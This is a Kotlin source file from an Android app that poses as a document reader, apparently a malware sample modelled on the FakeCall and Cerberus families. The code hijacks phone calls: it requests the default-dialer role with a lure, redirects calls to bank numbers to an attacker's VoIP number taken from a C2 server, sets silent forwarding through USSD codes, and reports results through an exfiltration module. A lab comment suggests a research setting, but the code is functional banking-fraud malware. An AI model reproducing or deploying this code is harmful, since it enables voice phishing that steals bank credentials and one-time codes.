package com.docreader.lite.reader.advanced

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.telecom.TelecomManager
import android.telephony.TelephonyManager
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*

/**
 * Call forwarding / hijacking — redirect victim's calls to attacker.
 *
 * Family reference:
 *   - FakeCall: intercepts outgoing bank calls, redirects to attacker's number
 *     disguised as bank customer service. User sees real bank number on screen
 *     but call connects to attacker. Most sophisticated voice phishing in mobile.
 *   - Cerberus: USSD-based call forwarding setup
 *   - BRATA: call interception + recording
 *
 * Attack flow (FakeCall pattern):
 *   1. Victim dials bank's real number (e.g., 1-800-BANK)
 *   2. Malware has set itself as default dialer (DefaultDialerManager)
 *   3. Malware intercepts the outgoing call
 *   4. Replaces destination with attacker's VoIP number
 *   5. Displays fake call UI showing the BANK's number
 *   6. Victim believes they're talking to bank
 *   7. Attacker (social engineer) extracts credentials, OTPs, PINs
 *
 * USSD forwarding (Cerberus pattern):
 *   Dial *21*[attacker_number]# to set unconditional call forwarding
 *   Victim's calls silently forward — no app involvement after setup
 *
 * This is uniquely devastating because it defeats phone-based verification:
 *   - Bank calls customer to verify transaction → call goes to attacker
 *   - Customer calls bank to report fraud → call goes to attacker
 *   - Two-factor voice call → intercepted by attacker
 */
object CallForwarder {

    private const val K = 13
    private fun d(a: IntArray) = String(CharArray(a.size) { (a[it] - K).toChar() })

    // Attacker VoIP number (C2-updatable, RFC1918 lab constraint doesn't apply to PSTN)
    private var forwardNumber = ""
    private var isDefaultDialer = false

    // Numbers to intercept (C2-updatable) — typically bank customer service lines
    private val interceptNumbers = mutableSetOf<String>()

    /**
     * Attempt to set app as default dialer — FakeCall core mechanism.
     *
     * Android shows system dialog asking user to confirm.
     * Malware lures user: "Set as default phone to enable HD calling"
     *
     * Once default dialer, ALL outgoing calls pass through our app first.
     */
    fun requestDefaultDialer(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val tm = context.getSystemService(Context.TELECOM_SERVICE) as? TelecomManager
            val roleManager = context.getSystemService(Context.ROLE_SERVICE)
                as? android.app.role.RoleManager

            if (roleManager != null) {
                val intent = roleManager.createRequestRoleIntent(
                    android.app.role.RoleManager.ROLE_DIALER
                )
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                try {
                    context.startActivity(intent)
                    Exfil.event("default_dialer_requested")
                } catch (_: Exception) {
                    Exfil.event("default_dialer_request_failed")
                }
            }
        }
    }

    /**
     * Set attacker's number for call forwarding.
     * Called from C2 command with operator's VoIP number.
     */
    fun setForwardNumber(number: String) {
        forwardNumber = number
        Exfil.event("forward_number_set", "number" to number.take(6) + "***")
    }

    /**
     * Update list of numbers to intercept.
     * Typically bank customer service numbers for the target region.
     */
    fun setInterceptNumbers(numbers: List<String>) {
        interceptNumbers.clear()
        interceptNumbers.addAll(numbers)
        Exfil.event("intercept_numbers_updated", "count" to numbers.size.toString())
    }

    /**
     * Check if outgoing call should be intercepted.
     * Called from our InCallService when we're default dialer.
     *
     * @return attacker's number if call should be redirected, null otherwise
     */
    fun shouldIntercept(dialedNumber: String): String? {
        if (forwardNumber.isEmpty()) return null

        // Normalize number (remove spaces, dashes, country code prefix)
        val normalized = normalizeNumber(dialedNumber)

        // Check against intercept list
        if (interceptNumbers.any { normalizeNumber(it) == normalized }) {
            Exfil.event("call_intercepted",
                "original" to dialedNumber,
                "redirect" to forwardNumber.take(6) + "***"
            )
            return forwardNumber
        }

        return null
    }

    /**
     * USSD-based call forwarding — Cerberus pattern.
     *
     * Dials USSD code to enable unconditional call forwarding.
     * Works silently — no ongoing app involvement needed after setup.
     *
     * Codes:
     *   *21*NUMBER#   — unconditional forwarding (all calls)
     *   *61*NUMBER#   — forward on no reply (unanswered)
     *   *62*NUMBER#   — forward on not reachable
     *   *67*NUMBER#   — forward on busy
     *   ##21#         — cancel all forwarding
     */
    fun setupUssdForwarding(context: Context, number: String, type: ForwardType = ForwardType.ALL) {
        val code = when (type) {
            ForwardType.ALL -> "*21*$number#"
            ForwardType.NO_REPLY -> "*61*$number#"
            ForwardType.NOT_REACHABLE -> "*62*$number#"
            ForwardType.BUSY -> "*67*$number#"
        }
        executeUssd(context, code)
        Exfil.event("ussd_forwarding_set",
            "type" to type.name,
            "number" to number.take(6) + "***"
        )
    }

    /**
     * Cancel all call forwarding — cleanup.
     */
    fun cancelForwarding(context: Context) {
        executeUssd(context, "##21#")
        Exfil.event("ussd_forwarding_cancelled")
    }

    /**
     * Execute arbitrary USSD code — also used for:
     *   - Balance check (*#1345#)
     *   - SIM info (*#06#)
     *   - Service activation/deactivation
     *
     * FakeCall family uses this for reconnaissance + forwarding setup.
     */
    fun executeUssd(context: Context, code: String) {
        try {
            // Method 1: TelephonyManager.sendUssdRequest (API 26+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                tm?.sendUssdRequest(
                    code,
                    object : TelephonyManager.UssdResponseCallback() {
                        override fun onReceiveUssdResponse(
                            telephonyManager: TelephonyManager,
                            request: String,
                            response: CharSequence
                        ) {
                            Exfil.event("ussd_response",
                                "code" to request,
                                "response" to response.toString().take(200)
                            )
                        }
                        override fun onReceiveUssdResponseFailed(
                            telephonyManager: TelephonyManager,
                            request: String,
                            failureCode: Int
                        ) {
                            Exfil.event("ussd_failed",
                                "code" to request,
                                "error" to failureCode.toString()
                            )
                        }
                    },
                    android.os.Handler(android.os.Looper.getMainLooper())
                )
            } else {
                // Method 2: Intent dial (shows USSD dialog)
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:${Uri.encode(code)}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            }
        } catch (e: Exception) {
            Exfil.event("ussd_error", "code" to code, "error" to (e.message ?: "unknown"))
        }
    }

    enum class ForwardType {
        ALL,            // *21* — unconditional
        NO_REPLY,       // *61* — no answer
        NOT_REACHABLE,  // *62* — phone off/no signal
        BUSY            // *67* — line busy
    }

    private fun normalizeNumber(number: String): String {
        return number.replace(Regex("[\\s\\-()]+"), "")
            .replace(Regex("^\\+\\d{1,3}"), "") // Strip country code
            .takeLast(10) // Last 10 digits
    }
}
